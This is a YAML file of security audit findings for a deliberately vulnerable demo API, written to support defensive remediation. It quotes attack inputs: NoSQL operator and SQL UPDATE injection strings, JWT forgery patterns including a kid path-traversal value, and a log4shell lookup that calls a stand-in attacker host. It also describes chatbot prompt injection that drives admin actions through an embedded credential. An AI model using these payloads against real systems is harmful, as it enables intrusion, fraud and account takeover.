finding:
  - schema_version: 1
    id: intg-e7ebcc95
    agent: integrity
    apd_tier: trustworthiness
    apd_goal: integrity
    disposition: gap
    severity: critical
    confidence: high
    title: "Mass assignment on /workshop/api/shop/orders accepts negative quantity"
    summary: "POST /workshop/api/shop/orders multiplies unit_price × quantity unconditionally; quantity:-100 inflates user credit by 100×price."
    detail: |
      The order-create handler in workshop deserializes the entire request
      body to the order domain object and computes `total = unit_price *
      quantity` with no positive-integer constraint on `quantity`. A caller
      submits `{"product_id": X, "quantity": -100}` and the signed delta is
      applied to `credit.balance`, minting balance equal to 100 × the
      product's unit price.

      The architectural concern is twofold: (a) input validation does not
      enforce the documented invariant INV-INPUT-001 (`quantity >= 1`), and
      (b) the deserialization is allowlist-free — the handler binds every
      field present in the JSON body onto the model, which is the broader
      OWASP API3:2023 (BOPLA write-side) pattern.

      Severity is critical per the API security rubric's mass-assignment
      clause "BOPLA — excessive property exposure or mass-assignment
      write-side exposure" — the rubric specifically calls out writeable
      `account_balance`, `order_status`, and `coupon_amount` as critical;
      writeable balance via negative-quantity is the same outcome at
      identical impact.

      The Confidentiality team's BOPLA-read finding (conf-c237e01d) and
      this finding are the two sides of the same architectural choice
      (no serializer/deserializer allowlist); the synthesizer will likely
      link them.
    evidence:
      - artifact: tech_plan.md
        locator: "§9 Mass Assignment #8/#9"
        excerpt: "POST /workshop/api/shop/orders allows negative quantity. The server applies the credit delta unconditionally, letting the caller mint balance"
      - artifact: threat-model.md
        locator: "§2 T-1"
        excerpt: "Caller submits quantity: -100 (negative). The server multiplies unit_price * quantity and applies the signed delta to the user's credit balance"
      - artifact: invariants.md
        locator: "INV-INPUT-001"
        excerpt: "Challenges 8 and 9 contradict — negative quantities accepted, balance inflated"
    control_mappings:
      nist_800_53r5: ["SI-10", "SI-10(5)", "AC-3", "SI-15", "CM-5"]
      mitre_attack:
        - technique: "T1190"
          sub_technique: null
          tactic: "TA0001"
          rationale: "Public-facing API endpoint with allowlist-free deserialization and missing input constraint enables direct manipulation of financial state via a single crafted request."
      cwe: ["CWE-915", "CWE-20", "CWE-840"]
      owasp_api_top10: ["API3:2023", "API6:2023"]
    recommendation:
      posture: required
      summary: "Enforce quantity ≥ 1 server-side and replace ORM-bind with an explicit allowlist serializer."
      detail: |
        (1) In `OrderCreateView` (Django), add a serializer
        `quantity = serializers.IntegerField(min_value=1)`; reject with
        400 on violation. (2) Replace the model-default DRF `ModelSerializer`
        with an explicit list of input fields (`product_id`, `quantity`,
        `coupon_code`) — every other field on the model must NOT appear in
        the writeable set. (3) Compute `unit_price` server-side from the
        product record, never trust client-supplied price (cross-ref T-4 /
        intg-6d98c520). (4) Add a smoke test asserting negative quantity is
        rejected with 400.
    related_concerns: [confidentiality, availability]
    cross_references: []

  - schema_version: 1
    id: intg-6d98c520
    agent: integrity
    apd_tier: trustworthiness
    apd_goal: integrity
    disposition: uncertainty
    severity: high
    confidence: medium
    title: "Server-derived unit_price not confirmed on order-create path"
    summary: "Inputs do not confirm whether unit_price is server-derived from the product record or accepted from the request body."
    detail: |
      The threat-model T-4 entry flags this as an unconfirmed risk: "If
      unit_price or total is passed in the request body and stored
      verbatim, the attacker pays an arbitrary amount." The challenge
      catalog frames challenge 9 as enabling balance manipulation; the
      mechanism is documented as negative quantity but the related
      unit_price concern is not explicitly resolved in inputs.

      Disposition is `uncertainty` rather than `gap` because the OpenAPI
      extract shipped in inputs does not include the request schema for
      POST /shop/orders. A determination requires source review.

      Severity is high per the rubric's BOPLA clause if the field is
      client-controlled; medium if server-derived. The high framing
      reflects the "expected worst case" under unresolved uncertainty.
    evidence:
      - artifact: threat-model.md
        locator: "§2 T-4"
        excerpt: "If unit_price or total is passed in the request body and stored verbatim, the attacker pays an arbitrary amount"
      - artifact: invariants.md
        locator: "INV-INPUT-002"
        excerpt: "Not confirmed from inputs. Challenge 9 suggests the field is at least partially client-controlled"
    prerequisite_evidence:
      - "POST /workshop/api/shop/orders request-body schema (which fields are accepted, which are server-derived)"
      - "OrderCreateView source for the unit_price assignment"
    control_mappings:
      nist_800_53r5: ["SI-10", "AC-3", "SI-15"]
      cwe: ["CWE-915", "CWE-840"]
      owasp_api_top10: ["API3:2023", "API6:2023"]
    recommendation:
      posture: required
      summary: "Confirm unit_price is computed server-side from products.unit_price; if not, fix per intg-e7ebcc95."
      detail: |
        Add an explicit assertion to the OpenAPI spec that POST /shop/orders
        accepts only `{product_id, quantity, coupon_code}`. Source-review
        the workshop OrderCreateView to confirm `unit_price = product.unit_price`
        on the server side. If the field is currently client-supplied, fold
        the fix into the intg-e7ebcc95 remediation (allowlist serializer
        already strips it).
    related_concerns: [confidentiality]
    cross_references: []

  - schema_version: 1
    id: intg-b7417f91
    agent: integrity
    apd_tier: trustworthiness
    apd_goal: integrity
    disposition: gap
    severity: critical
    confidence: high
    title: "NoSQL injection on /community/api/v2/coupon/validate-coupon"
    summary: "Request body is parsed directly into a Mongo query selector; {coupon_code: {$ne: ''}} returns arbitrary coupon documents."
    detail: |
      The community service's `validate-coupon` handler in Go parses the
      JSON request body and passes the resulting structure into a Mongo
      Find selector with no sanitization. An attacker submits
      `{"coupon_code": {"$ne": ""}}` and the selector matches every coupon
      document; submitting `{"coupon_code": {"$regex": ".*"}}` is
      equivalent.

      The architectural issue is the absence of a typed request schema. A
      properly typed handler would unmarshal into a struct with
      `CouponCode string` and pass `bson.M{"coupon_code": req.CouponCode}`
      — the injection surface vanishes. The current handler accepts the
      raw map.

      Severity is critical per "SQL or NoSQL injection on a PII-bearing
      endpoint" in the API security rubric. The coupons collection here
      does not directly carry PII, but the same injection pattern on the
      coupon_documents collection enables arbitrary document read which
      reaches into the broader mongo schema (posts collection, chatbot
      history collection — both PII-bearing) under the shared admin
      credential (conf-3e324699).
    evidence:
      - artifact: tech_plan.md
        locator: "§9 NoSQL Injection #12"
        excerpt: "/community/api/v2/coupon/validate-coupon endpoint parses the request body directly into a Mongo query selector"
      - artifact: threat-model.md
        locator: "§2 T-3"
        excerpt: "NoSQL: the request body is interpreted as a Mongo query selector; sending {coupon_code: {$ne: ''}} returns arbitrary coupon documents"
    control_mappings:
      nist_800_53r5: ["SI-10", "SI-10(5)", "AC-3", "AC-6"]
      mitre_attack:
        - technique: "T1190"
          sub_technique: null
          tactic: "TA0001"
          rationale: "User-controlled JSON forwarded as a Mongo query selector enables operator-injection against an arbitrary collection in the shared-credential datastore."
      cwe: ["CWE-943", "CWE-89", "CWE-20"]
      owasp_api_top10: ["API10:2023", "API8:2023"]
    recommendation:
      posture: required
      summary: "Unmarshal validate-coupon into a typed struct; never pass user input as a Mongo selector."
      detail: |
        Replace the current handler's `json.Unmarshal(body, &m)` (map
        unmarshal) with `json.Unmarshal(body, &req)` where `req` is a
        struct `{CouponCode string \`json:"coupon_code"\`}`. Construct the
        selector as `bson.M{"coupon_code": req.CouponCode}` — never as
        `bson.M(m)`. Add a schema-validation step (e.g., go-playground/
        validator with `validate:"required,alphanum,max=64"`). Confirm
        every other community handler follows the same pattern.
    related_concerns: [confidentiality, availability]
    cross_references: []

  - schema_version: 1
    id: intg-2aeb03f1
    agent: integrity
    apd_tier: trustworthiness
    apd_goal: integrity
    disposition: gap
    severity: critical
    confidence: high
    title: "SQL injection on /workshop/api/shop/apply_coupon (string concatenation in claim-state UPDATE)"
    summary: "The workshop apply_coupon flow concatenates the coupon code into a SQL UPDATE statement; UPDATE injection re-arms claimed coupons."
    detail: |
      The workshop service's `apply_coupon` handler constructs the
      claim-state UPDATE statement via string concatenation with the
      caller-supplied `coupon_code`. An attacker supplies a code containing
      `'); UPDATE coupons SET claimed_by=NULL WHERE 1=1 -- ` (or similar)
      and the UPDATE clears the claimed_by field across the table, making
      every coupon re-redeemable.

      This is the standard SQL-injection pattern: user input concatenated
      into a SQL fragment with no parameterization. Django ORM provides
      parameterized queries by default; the affected handler is presumably
      using `raw()` or `cursor.execute()` with format-string substitution.

      Severity is critical per "SQL or NoSQL injection on a PII-bearing
      endpoint" in the API security rubric. The coupons table itself does
      not carry PII, but the same SQL connection has full access to the
      users, vehicles, orders, and credit tables under the shared admin
      credential (conf-3e324699). Direct UNION SELECT against the
      coupons-table query yields users.email/password/role records.
    evidence:
      - artifact: tech_plan.md
        locator: "§9 SQL Injection #13"
        excerpt: "workshop apply_coupon flow concatenates SQL; UPDATE statements can be injected to clear claimed flags"
      - artifact: threat-model.md
        locator: "§2 T-3"
        excerpt: "SQL: the workshop side concatenates the coupon code into a SQL fragment, enabling UPDATE injection"
      - artifact: invariants.md
        locator: "INV-INPUT-003"
        excerpt: "Challenge 13 contradicts via SQL injection on the claimed-state UPDATE"
    control_mappings:
      nist_800_53r5: ["SI-10", "SI-10(5)", "AC-3", "AC-6", "CM-5"]
      mitre_attack:
        - technique: "T1190"
          sub_technique: null
          tactic: "TA0001"
          rationale: "User input concatenated into a SQL fragment on a public endpoint enables UNION-based read of PII tables sharing the same connection credential."
      cwe: ["CWE-89", "CWE-20"]
      owasp_api_top10: ["API10:2023", "API8:2023"]
    recommendation:
      posture: required
      summary: "Replace string-concatenated SQL with parameterized queries; audit every workshop handler for similar patterns."
      detail: |
        (1) In `apply_coupon`, replace
        `cursor.execute(f"UPDATE coupons SET claimed_by='{user}' WHERE code='{code}'")`
        with the parameterized form
        `cursor.execute("UPDATE coupons SET claimed_by=%s WHERE code=%s", [user, code])`,
        or equivalent ORM call
        `Coupon.objects.filter(code=code).update(claimed_by=user)`.
        (2) Grep the workshop service for `.raw(`, `cursor.execute`, and
        any f-string SQL construction; convert all to ORM or
        parameterized form. (3) Add a CI lint rule (e.g., `bandit -t B608`)
        that fails the build on any new SQL-string-concatenation pattern.
    related_concerns: [confidentiality, immutability]
    cross_references: []

  - schema_version: 1
    id: intg-15c04a1c
    agent: integrity
    apd_tier: trustworthiness
    apd_goal: integrity
    disposition: gap
    severity: critical
    confidence: high
    title: "JWT verifier accepts multiple algorithms (alg:none, HS256-with-RSA-pubkey, jku-fetch, kid-traversal)"
    summary: "Identity service accepts JWTs under at least four documented forgery patterns due to multi-algorithm support, jku fetch, and kid-as-filesystem-path."
    detail: |
      Per ADR-0002 and challenge 15, the identity service's JWT verifier
      accepts tokens that should be rejected:

      (1) RS256 → HS256 algorithm confusion: a token with `alg: HS256`
      signed using the base64-encoded RSA public modulus as the HMAC key
      validates. Root cause: the verifier does not pin `alg`.

      (2) `alg: none` on the dashboard endpoint: the dashboard handler
      reads `sub` without signature verification. Root cause: per-handler
      verification logic is independent of the library default.

      (3) `jku` header trust: the verifier fetches a JWK from the URL in
      the `jku` header with no allowlist. Root cause: jku-fetch enabled
      with no policy.

      (4) `kid` as filesystem path: the verifier treats `kid` as a path,
      so `kid: ../../../../../../dev/null` plus the all-zero HMAC key
      validates. Root cause: kid-handling is filesystem-coupled.

      Severity is critical per "Authentication bypass to high-privilege
      functions with no factor required" — the rubric explicitly enumerates
      "JWT alg:none accepted, signature verification skipped" as critical.
      Each of the four patterns above independently produces forge-any-
      identity capability; together they enable the attacker to pick the
      easiest path against whichever service is the target.

      This is the Integrity framing (the data — the token itself — fails
      tamper-detection); Authenticity owns the credential-strength /
      identity-verification framing (auth-jwt-verification-bypass) and
      will write a sibling finding. The synthesizer should merge these
      into a single record carrying both perspectives.
    evidence:
      - artifact: tech_plan.md
        locator: "§9 JWT vulnerabilities #15"
        excerpt: "RS256↔HS256 algorithm confusion (public JWK as HMAC key). Signature-validation bypass on the dashboard endpoint (sub accepted without signature check)"
      - artifact: adrs/0002-jwt-with-rsa-and-jwks.md
        locator: "Consequences"
        excerpt: "Algorithm-confusion (RS256 ↔ HS256) is the headline forgery vector"
      - artifact: threat-model.md
        locator: "§1 S-1, S-2, S-3, S-4"
        excerpt: "Four documented JWT forgery patterns: algorithm confusion, alg:none on dashboard, jku misuse, kid path traversal"
    control_mappings:
      nist_800_53r5: ["SI-7", "SI-7(1)", "IA-2", "IA-5(2)", "SC-13", "SC-23"]
      mitre_attack:
        - technique: "T1606"
          sub_technique: null
          tactic: "TA0006"
          rationale: "Multiple verifier weaknesses (no alg-pin, jku-fetch, kid-as-path) enable forging valid web credentials for any user without obtaining the signing key."
        - technique: "T1550"
          sub_technique: "T1550.001"
          tactic: "TA0008"
          rationale: "Forged JWT functions as a valid application access token across every downstream service trusting identity's JWKS."
      cwe: ["CWE-347", "CWE-22", "CWE-918"]
      owasp_api_top10: ["API2:2023"]
    recommendation:
      posture: required
      summary: "Pin alg:RS256 in every verifier; remove JWT_SECRET env; allowlist jku and kid."
      detail: |
        Per-verifier configuration changes (in identity, workshop,
        community, chatbot's verifier wrappers):

        (1) Remove `JWT_SECRET=crapi` from the identity env entirely. No
        verifier accepts HMAC-family algorithms (`HS*`) under any
        circumstances. Configure each library wrapper to pin `RS256` and
        reject all other `alg` values including `none`.

        (2) Add a centralized `verifyJwt(token)` helper per service that
        wraps the library call with explicit `alg` enforcement. Audit
        the dashboard handler to use this helper — no per-handler
        signature-skipping (challenge 15 #2).

        (3) For `jku` and `x5u` headers, configure the library to reject
        them outright (no remote fetch) or to enforce a hardcoded
        allowlist (the identity service's own JWKS URL only).

        (4) For `kid`, configure the library's key-resolver callback to
        look up against the in-memory JWKS set (loaded once from the
        configured JWKS URL or local file) rather than from a filesystem
        path; reject unknown `kid` values.

        (5) Add per-verifier integration tests that send each of the four
        challenge-15 forgery patterns and assert rejection.
    related_concerns: [authenticity, ephemeral, non_repudiation]
    cross_references: []

  - schema_version: 1
    id: intg-5c659bdb
    agent: integrity
    apd_tier: trustworthiness
    apd_goal: integrity
    disposition: gap
    severity: high
    confidence: high
    title: "SSRF on contact_mechanic — input validation absent on outbound webhook URL"
    summary: "POST /workshop/api/merchant/contact_mechanic accepts an arbitrary URL string with no schema constraint, no allowlist, no DNS-resolution check."
    detail: |
      The Integrity framing of the SSRF concern (paired with
      conf-cf457739's Confidentiality framing and an Authenticity framing
      in tier 3): the workshop service accepts a `mechanic_api` URL field
      with no input validation on the URL shape, scheme, host, or
      resolved IP. The handler then performs an outbound HTTP fetch
      against whatever it receives.

      Input-validation gaps on URL fields are a recurring SSRF
      precondition. A robust handler would (a) enforce a typed URL field
      with scheme restricted to https, (b) resolve the URL host, (c)
      reject if the resolved address is RFC-1918 / link-local / loopback
      / metadata-address, (d) rebind the resolved IP into the fetch to
      defeat DNS-rebinding.

      Severity is high per "SSRF reaching internal services or cloud
      metadata" in the API security rubric. This Integrity finding
      complements conf-cf457739 (Confidentiality) — they share evidence
      and the recommendation pieces are coupled; the synthesizer should
      merge them.
    evidence:
      - artifact: tech_plan.md
        locator: "§9 SSRF #11"
        excerpt: "No allowlist; works against localhost, 169.254.169.254, and arbitrary external hosts"
      - artifact: invariants.md
        locator: "INV-INPUT-004"
        excerpt: "Challenge 11 contradicts on contact_mechanic"
      - artifact: threat-model.md
        locator: "§4 I-4"
        excerpt: "Is there any URL allowlist or DNS-based filter on the outbound request? Inputs say no"
    control_mappings:
      nist_800_53r5: ["SI-10", "SC-7", "SC-7(5)", "AC-4"]
      mitre_attack:
        - technique: "T1190"
          sub_technique: null
          tactic: "TA0001"
          rationale: "Input validation absent on a URL field that drives a server-side fetch is the structural cause of the SSRF; the architectural fix is input-side."
      cwe: ["CWE-918", "CWE-20"]
      owasp_api_top10: ["API7:2023"]
    recommendation:
      posture: required
      summary: "Add URL schema validation + IP-resolution check on the contact_mechanic input path."
      detail: |
        See conf-cf457739 for the paired recommendation. Specifically on
        the input-validation side: define a typed `mechanic_api` field in
        the request serializer as `URLField(schemes=['https'])`, add a
        post-validation step that resolves the host via `socket.gethostbyname`,
        rejects RFC-1918 / link-local / loopback / 169.254.169.254 / ::1 /
        fc00::/7, and stores the resolved IP for the rebind-safe fetch.
    related_concerns: [confidentiality, authenticity, availability]
    cross_references: []

  - schema_version: 1
    id: intg-62ebf664
    agent: integrity
    apd_tier: trustworthiness
    apd_goal: integrity
    disposition: gap
    severity: high
    confidence: high
    title: "Mass assignment on /identity/api/v2/user/videos/{video_id} accepts internal fields"
    summary: "The shadow video-update endpoint persists arbitrary fields in the request body, including the internal conversion_params field leaked by I-3 / EDE #5."
    detail: |
      The video update endpoint (challenge 10) deserializes the entire
      request body to the video model with no allowlist. The internal
      `conversion_params` field — exposed read-side by the EDE #5 leak
      (conf-c237e01d) — is therefore writeable. An attacker discovers the
      field name from the read-side leak and supplies a controlled value
      in an update; the model persists it.

      Per T-2 in the threat model, the downstream consumer of
      `conversion_params` is not enumerated in the inputs, but the
      challenge framing suggests it drives downstream processing (e.g., a
      conversion command-line whose flags include the attacker-controlled
      value — adjacent to ENABLE_SHELL_INJECTION).

      Severity is high per the BOPLA write-side clause. If
      `conversion_params` drives a shell-out, severity is critical (the
      rubric escalates injection on PII surfaces); without source
      confirmation of the downstream sink we hold at high.
    evidence:
      - artifact: tech_plan.md
        locator: "§9 Mass Assignment #10"
        excerpt: "A shadow update endpoint accepts arbitrary internal video fields, reachable by leveraging the leaked field name from #5"
      - artifact: threat-model.md
        locator: "§2 T-2"
        excerpt: "Caller learns the internal property name from challenge 5 (excessive data exposure), submits an update payload including that property, and the server persists it"
    control_mappings:
      nist_800_53r5: ["SI-10", "AC-3", "SI-15"]
      mitre_attack:
        - technique: "T1190"
          sub_technique: null
          tactic: "TA0001"
          rationale: "Allowlist-free deserialization permits writes to internal fields whose names leak via a paired read-side BOPLA, chaining read-disclosure to write-influence."
      cwe: ["CWE-915", "CWE-20"]
      owasp_api_top10: ["API3:2023"]
    recommendation:
      posture: required
      summary: "Add allowlist serializer on video-update; strip conversion_params and any non-user-facing field from writeable set."
      detail: |
        In the identity service's video-update handler, replace the
        model-bind with an explicit DTO listing only `title`, `description`,
        `metadata`. Persist via partial-update against the model rather
        than full deserialization. Audit other identity update endpoints
        (user-profile update, vehicle update) for the same pattern.
    related_concerns: [confidentiality, authenticity]
    cross_references: []

  - schema_version: 1
    id: intg-a6b6d147
    agent: integrity
    apd_tier: trustworthiness
    apd_goal: integrity
    disposition: gap
    severity: high
    confidence: medium
    title: "Mass-assignment on user-update may expose role field (E-3)"
    summary: "Threat model E-3 flags possible mass-assignment to users.role on a self-update endpoint; not confirmed in OpenAPI but consistent with the pattern."
    detail: |
      Threat-model entry E-3 surfaces the concern that a self-update
      endpoint may bind a `role` field client-supplied. If the role enum
      includes `admin` and the handler binds it, an attacker submits
      `{"name": "...", "role": "admin"}` on a benign-looking profile
      update and self-elevates.

      The OpenAPI extract in inputs does not include a `/user/update`
      endpoint, but the same allowlist-free deserialization pattern that
      enables intg-e7ebcc95, intg-62ebf664, and intg-b7417f91 makes E-3
      structurally plausible. The intake brief flags this as an evidence
      gap.

      Severity is high per the BOPLA write-side clause specifically
      because privilege-relevant fields are at issue ("writeable
      is_admin", "writeable role" per the rubric); confidence is medium
      pending source confirmation of the writeable surface.
    evidence:
      - artifact: threat-model.md
        locator: "§6 E-3"
        excerpt: "Caller submits {role: admin} alongside benign fields on a self-update; the field is bound to the user record"
      - artifact: tech_plan.md
        locator: "§5 Data model users"
        excerpt: "users — email (primary natural key), name, phone, password (storage scheme unspecified in inputs), role"
    prerequisite_evidence:
      - "Identity user-update endpoint definition and request schema (if endpoint exists)"
      - "Spring binding-allowlist or @JsonIgnoreProperties on the User entity"
    control_mappings:
      nist_800_53r5: ["SI-10", "AC-3", "AC-6"]
      mitre_attack:
        - technique: "T1078"
          sub_technique: null
          tactic: "TA0004"
          rationale: "Mass-assignment write to a role field is the canonical privilege-escalation path through valid-account binding."
      cwe: ["CWE-915", "CWE-269"]
      owasp_api_top10: ["API3:2023", "API5:2023"]
    recommendation:
      posture: required
      summary: "If a user-update endpoint exists, add an allowlist DTO that excludes role; confirm role is admin-only-writeable."
      detail: |
        Audit identity for any endpoint that updates the User entity from
        a request body. For each: replace `@RequestBody User` binding with
        a `UserSelfUpdateDto` containing only `name`, `phone`, `email`
        (with email-change going through the OTP-verified flow). The
        `role` field must be writeable only through an admin-scoped
        endpoint, with a separate authorization check.
    related_concerns: [authenticity, confidentiality]
    cross_references: []

  - schema_version: 1
    id: intg-ab3edc7a
    agent: integrity
    apd_tier: trustworthiness
    apd_goal: integrity
    disposition: gap
    severity: high
    confidence: high
    title: "Coupon redemption is not idempotent — SQL injection re-arms claimed flag"
    summary: "INV-INPUT-003 asserts coupon redemption is idempotent per user; challenge 13's SQL injection on apply_coupon defeats the claimed-state check."
    detail: |
      The architect asserts coupon redemption is idempotent per user
      (INV-INPUT-003). The workshop `apply_coupon` flow checks a
      `claimed_by` column before applying — the intended idempotency
      mechanism. The SQL injection in intg-2aeb03f1 (challenge 13) allows
      a malicious code submission to UPDATE the `claimed_by` field to
      NULL across rows, breaking the idempotency check and re-arming
      every coupon for re-redemption.

      This Integrity finding is a transactional-guarantee concern — the
      claimed-state UPDATE that should be a once-per-user write is
      defeated by an injection in the input path. Distinct from
      intg-2aeb03f1 (the SQL-injection mechanism itself) in that this
      finding frames the *consequence* — broken idempotency on a
      financial mutating endpoint.

      Severity is high per the rubric clause "Idempotency missing on
      payment, refund, or order-mutation endpoints; double-submit produces
      duplicate side effects" — here idempotency is *present* but
      defeatable.
    evidence:
      - artifact: invariants.md
        locator: "INV-INPUT-003"
        excerpt: "Challenge 13 contradicts via SQL injection on the claimed-state UPDATE"
      - artifact: tech_plan.md
        locator: "§9 SQL Injection #13"
        excerpt: "UPDATE statements can be injected to clear claimed flags"
    control_mappings:
      nist_800_53r5: ["SI-10", "SI-7", "SC-5", "AU-12"]
      cwe: ["CWE-89", "CWE-840"]
      owasp_api_top10: ["API6:2023", "API10:2023"]
    recommendation:
      posture: required
      summary: "Fix the underlying SQL injection (intg-2aeb03f1) and add a unique constraint enforcing the claimed-state invariant at the schema level."
      detail: |
        (1) Apply the SQL-injection remediation from intg-2aeb03f1.
        (2) Add a database-level constraint that enforces the
        idempotency invariant: a UNIQUE index on
        `(coupon_code, claimed_by)` where `claimed_by IS NOT NULL`. This
        ensures even a successful injection cannot re-redeem because the
        UPDATE would violate the constraint.
        (3) Add an idempotency-key support to the apply_coupon endpoint
        for resilient client retries — out of scope of the immediate fix
        but a hardening recommendation.
    related_concerns: [confidentiality, availability, non_repudiation]
    cross_references: []

  - schema_version: 1
    id: intg-078ee9f6
    agent: integrity
    apd_tier: trustworthiness
    apd_goal: integrity
    disposition: gap
    severity: high
    confidence: high
    title: "Chatbot prompt-injection drives privileged actions via embedded admin credential"
    summary: "POST /chatbot/genai/chat passes user input through an agent loop that calls crAPI endpoints using API_USER/API_PASSWORD; no tool-call allowlist."
    detail: |
      The chatbot container holds `API_USER=admin@example.com /
      API_PASSWORD=Admin!123` and uses these to act on the user's behalf
      when the agent loop decides to call a crAPI endpoint. Per
      challenges 16/17/18, a crafted prompt induces the chatbot to call
      privileged endpoints as that admin — performing data extraction,
      cross-user action, or persistent state change on behalf of the
      prompt author.

      The Integrity framing: the system trusts the chatbot's "intent
      classification" of the user prompt as data, but the prompt is itself
      user input that flows into a write-path. Per the active domain
      pack's integrity common-patterns, "schema enforcement bypassed by
      polymorphic deserialization" is one variant of the underlying class
      — here the "type field" controlling the next action is the LLM's
      interpretation of the prompt, and the input validation that should
      gate write-path authorization is absent.

      Severity is high per "BFLA exposing admin functions to authenticated
      low-privilege users" — the chatbot path is a BFLA mechanism even
      when the chatbot calls a non-admin-shaped endpoint, because the
      admin credential confers admin authority on every call.

      Authenticity also writes this finding from the credential-strength
      angle, and Non-Repudiation writes it from the audit-attribution
      angle. The synthesizer should merge across three lenses.
    evidence:
      - artifact: tech_plan.md
        locator: "§9 LLM #16/17/18"
        excerpt: "Chatbot prompt-injection allowing client-side rendering injection (#16), credential extraction of another user (#17), and action-on-behalf-of (#18) flows"
      - artifact: threat-model.md
        locator: "§2 T-5"
        excerpt: "Because the chatbot holds API_USER=admin@example.com / API_PASSWORD=Admin!123, the call hits identity / workshop as that admin and executes"
      - artifact: architecture-index.md
        locator: "§crapi-chatbot"
        excerpt: "prompt-injection allows the chatbot to perform actions as that admin against other services"
    control_mappings:
      nist_800_53r5: ["SI-10", "AC-3", "AC-6", "AC-6(1)", "AC-6(5)", "IA-9"]
      mitre_attack:
        - technique: "T1078"
          sub_technique: null
          tactic: "TA0004"
          rationale: "Chatbot's embedded admin credential is a valid-account that prompt-injection coerces into use for privileged operations on behalf of unprivileged users."
      cwe: ["CWE-77", "CWE-285", "CWE-269", "CWE-94"]
      owasp_api_top10: ["API5:2023", "API8:2023"]
    recommendation:
      posture: required
      summary: "Remove the embedded admin credential; have the chatbot act under the user's own token via on-behalf-of delegation."
      detail: |
        (1) Remove `API_USER`/`API_PASSWORD` from the chatbot env. (2)
        Pass the user's bearer JWT into the chatbot session via the
        chat-call's `Authorization` header (already present); the
        chatbot's outbound calls re-use that token and inherit the user's
        actual privileges. (3) Introduce an explicit allowlist of
        chatbot-callable tools per user role; any tool not on the
        allowlist is rejected before the LLM-classified intent can drive
        the call. (4) Audit-log every chatbot-driven crAPI call with the
        original prompt's session id and the user's bearer-derived
        actor (cross-ref nonrep-chatbot-attribution).
    related_concerns: [authenticity, non_repudiation, confidentiality]
    cross_references: []

  - schema_version: 1
    id: intg-8d97cd9f
    agent: integrity
    apd_tier: trustworthiness
    apd_goal: integrity
    disposition: gap
    severity: medium
    confidence: high
    title: "ENABLE_LOG4J and ENABLE_SHELL_INJECTION feature flags wire deliberate injection sinks into identity"
    summary: "Identity service env exposes ENABLE_LOG4J=false and ENABLE_SHELL_INJECTION=false flags; when true, deliberate log4shell/command-injection sinks are reachable."
    detail: |
      Identity ships with two feature flags that, when enabled, wire
      classic injection sinks into the live code path:

      - `ENABLE_LOG4J=true` enables a log4shell-style sink — likely a
        user-input field logged via a vulnerable log4j path so that
        `${jndi:ldap://attacker/x}` triggers RCE.
      - `ENABLE_SHELL_INJECTION=true` enables a command-injection sink —
        likely a video-conversion shell-out parameterized with caller-
        controlled input.

      The default values are `false`, but the flags exist as deployable
      env. Per the input-trust boundary and the documented evidence, the
      flags are part of the artifact — operators may flip them
      accidentally or for testing.

      The Integrity framing is the flags themselves: a system whose
      runtime behavior is gated on an env var that flips a critical
      input-validation control is a configuration-integrity concern.
      Severity is medium because the default-off state is the deployed
      state in any unattended deploy; this would be critical if the
      defaults were `true`.
    evidence:
      - artifact: tech_plan.md
        locator: "§9 Implicit posture facts"
        excerpt: "ENABLE_LOG4J=false flag exists, implying a deliberate log4j-injection toggle is wired into the identity service. ENABLE_SHELL_INJECTION=false flag exists in the identity env"
      - artifact: architecture-index.md
        locator: "§crapi-identity"
        excerpt: "ENABLE_LOG4J and the historical log4shell-style switch are wired here"
      - artifact: prior-audit.md
        locator: "§Operational hygiene"
        excerpt: "ENABLE_LOG4J=false toggle wired into identity. Implies a deliberate log4shell-style injection sink exists behind the flag"
    control_mappings:
      nist_800_53r5: ["CM-7", "CM-7(5)", "SI-10", "SI-7", "CM-3"]
      cwe: ["CWE-94", "CWE-78", "CWE-117"]
      owasp_api_top10: ["API8:2023"]
    recommendation:
      posture: required
      summary: "Remove the injection-sink feature flags entirely; replace with explicit demo-mode versioning."
      detail: |
        For non-demo deploys, remove the `ENABLE_LOG4J` and
        `ENABLE_SHELL_INJECTION` code paths from the identity service.
        For demo deploys, gate the sinks behind a single
        `DEMO_MODE=true` env with a startup banner that names every
        enabled sink. The current flag shape is dangerous because
        flipping one flag to true silently activates a critical
        vulnerability with no operator signal.
    related_concerns: [confidentiality, availability]
    cross_references: []

  - schema_version: 1
    id: intg-b097f9a8
    agent: integrity
    apd_tier: trustworthiness
    apd_goal: integrity
    disposition: blocked
    severity: medium
    confidence: medium
    title: "Cross-store consistency between coupons (Postgres) and coupon_documents (Mongo) is application-mediated"
    summary: "ADR-0004 places coupon state in both Postgres (claim flag) and Mongo (metadata) with no consistency contract; partial-failure behavior unspecified."
    detail: |
      Per ADR-0004, the coupon flow touches Postgres (`coupons.claimed_by`)
      and Mongo (`coupon_documents` metadata) without a coordination
      protocol. The ADR explicitly notes "cross-store consistency is the
      application's responsibility" and frames it as an intentional
      teaching pattern.

      The Integrity concern: under partial failure (Postgres commits,
      Mongo write fails) the two stores diverge. There is no compensating-
      action protocol, no saga pattern, no two-phase commit. The
      challenge-13 SQL injection further weaponizes the divergence by
      re-arming the claimed flag in Postgres while leaving Mongo intact.

      This is `blocked` because the deployed coordination posture (or
      absence) is not specified in the inputs and the ADR is explicit
      that the absence is intentional. Severity is medium because the
      financial impact is bounded to coupon-redemption disputes; it
      escalates if cross-store divergence affects orders or credit
      records.
    evidence:
      - artifact: adrs/0004-dual-datastore-postgres-and-mongo.md
        locator: "Consequences"
        excerpt: "Cross-store consistency is the application's responsibility. A coupon-redemption flow that touches both stores can leave the records in inconsistent states under partial failure"
      - artifact: tech_plan.md
        locator: "§5 Data model community"
        excerpt: "coupons (postgres) — code, claimed_by FK; coupon_documents (mongo) — coupon metadata"
    prerequisite_evidence:
      - "Cross-store coupon-flow source: the community validate-coupon and workshop apply_coupon handlers and their failure-handling paths"
      - "Reconciliation script or runbook for divergence detection"
    control_mappings:
      nist_800_53r5: ["SI-7", "SI-10", "CP-12"]
      cwe: ["CWE-362", "CWE-840"]
      owasp_api_top10: ["API6:2023", "API10:2023"]
    recommendation:
      posture: recommended
      summary: "Document the coupon-flow saga; add a reconciliation runbook and a periodic divergence check."
      detail: |
        Add a sequence diagram to ADR-0004 showing the
        validate-coupon → apply-coupon flow's commit ordering. Define the
        compensating action on Mongo when Postgres commit fails (and vice
        versa). Add a daily reconciliation job that compares the
        Postgres `claimed_by` set against the Mongo `coupon_documents`
        redemption field and emits divergence alerts.
    related_concerns: [resilient, distributed, non_repudiation]
    cross_references: []
